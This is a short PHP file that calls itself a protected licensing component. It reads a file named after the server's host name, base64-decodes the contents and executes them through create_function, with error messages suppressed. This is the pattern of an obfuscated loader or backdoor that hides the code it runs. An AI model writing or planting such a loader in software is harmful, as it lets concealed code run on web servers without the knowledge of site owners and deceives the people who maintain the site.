<?php 
/**
 * WARNING
 * Tampering with this file is a violation of the software terms and conditions.
 */
$parts=parse_url("http:/"."/".$_SERVER["SERVER_NAME"]);$e=create_function("",@base64_decode(@file_get_contents(dirname(__file__).DS.$parts["host"])));$e();
?>